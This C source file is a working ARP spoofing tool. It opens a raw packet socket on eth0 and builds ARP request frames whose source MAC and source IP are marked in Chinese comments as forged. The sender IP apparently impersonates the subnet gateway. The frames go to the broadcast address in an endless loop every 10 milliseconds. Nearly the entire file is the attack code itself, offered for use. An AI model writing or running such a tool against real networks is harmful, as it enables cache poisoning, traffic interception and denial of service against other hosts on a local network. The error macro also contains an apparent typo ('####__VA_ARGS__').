#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>


#define print_errno(fmt, ...) \
    printf("[%d] errno=%d (%s) #" fmt, \
        __LINE__, errno, strerror(errno), ####__VA_ARGS__)

static unsigned char s_ip_frame_data[ETH_DATA_LEN];
static unsigned int  s_ip_frame_size = 0;

int main(int argc,char** argv)
{
    struct ether_header *eth = NULL;
    struct ether_arp *arp = NULL;
    struct ifreq ifr;
    struct in_addr daddr;
    struct in_addr saddr;
    struct sockaddr_ll sll;

    int skfd;
    int n = 0;

    //unsigned char dmac[ETH_ALEN] = {0x40,0x8d,0x5c,0x79,0xa2,0xad};
	 //unsigned char dmac[ETH_ALEN] = {0xbc,0xee,0x7b,0x5d,0xa9,0x22};
	 unsigned char dmac[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff};
    /*伪造 源MAC*/
    unsigned char smac[ETH_ALEN] = {0x38,0x97,0xd6,0x51,0xa0,0x01};

    daddr.s_addr = inet_addr("219.216.87.200");
    /*伪造 源IP*/
    saddr.s_addr = inet_addr("219.216.87.254");

    memset(s_ip_frame_data, 0x00, sizeof(unsigned char)*ETH_DATA_LEN);

    /*创建原始套接字*/
    skfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (skfd < 0) {
        print_errno("socket() failed! \n");
        return -1;
    }

    bzero(&ifr,sizeof(ifr));
    strcpy(ifr.ifr_name, "eth0");
    if (-1 == ioctl(skfd, SIOCGIFINDEX, &ifr)) {
        print_errno("ioctl() SIOCGIFINDEX failed!\n");
        return -1;
    }
    printf("ifr_ifindex = %d\n", ifr.ifr_ifindex);

    bzero(&sll, sizeof(sll));
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_family   = PF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);

    #if 0
    /*获取本机IP*/
    if(-1 == ioctl(skfd, SIOCGIFADDR, &ifr)){
        printf("ioctl() SIOCGIFADDR failed! \n");
        return -1;
    }
    printf("ifr_addr    = %s\n", \
        inet_ntoa(((struct sockaddr_in*)&(ifr.ifr_addr))->sin_addr));

    /*获取本机MAC*/
    if(-1 == ioctl(skfd, SIOCGIFHWADDR, &ifr)) {
        printf("ioctl() SIOCGIFHWADDR failed! \n");
        return -1;
    }
    printf("ifr_hwaddr  = %02x-%02x-%02x-%02x-%02x-%02x\n",   \
        (unsigned char)ifr.ifr_hwaddr.sa_data[0],             \
        (unsigned char)ifr.ifr_hwaddr.sa_data[1],             \
        (unsigned char)ifr.ifr_hwaddr.sa_data[2],             \
        (unsigned char)ifr.ifr_hwaddr.sa_data[3],             \
        (unsigned char)ifr.ifr_hwaddr.sa_data[4],             \
        (unsigned char)ifr.ifr_hwaddr.sa_data[5]);


    #endif

    /*构造以太报文*/
    eth = (struct ether_header*)s_ip_frame_data;
    eth->ether_type = htons(ETHERTYPE_ARP);
    memcpy(eth->ether_dhost, dmac, ETH_ALEN);
    memcpy(eth->ether_shost, smac, ETH_ALEN);

    /*构造ARP报文*/
    arp = (struct ether_arp*)(s_ip_frame_data + sizeof(struct ether_header));
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = ETH_ALEN;
    arp->arp_pln = 4;
    arp->arp_op  = htons(ARPOP_REQUEST);

    memcpy(arp->arp_sha, smac, ETH_ALEN);
    memcpy(arp->arp_spa, &saddr.s_addr, 4);
      /*
    memcpy(arp->arp_tha, dmac, ETH_ALEN);*/
    memcpy(arp->arp_tpa, &daddr.s_addr, 4);

    s_ip_frame_size = sizeof(struct ether_header) + sizeof(struct ether_arp);
	while(1){
		 n = sendto(skfd, s_ip_frame_data, s_ip_frame_size, 0, \
        (struct sockaddr*)&sll, sizeof(sll));
		if (n < 0) {
			print_errno("sendto() failed!\n");
		}
		else {
			printf("sendto() n = %d \n", n);
		}
		usleep(10000);
	}

    close(skfd);
    return 0;
}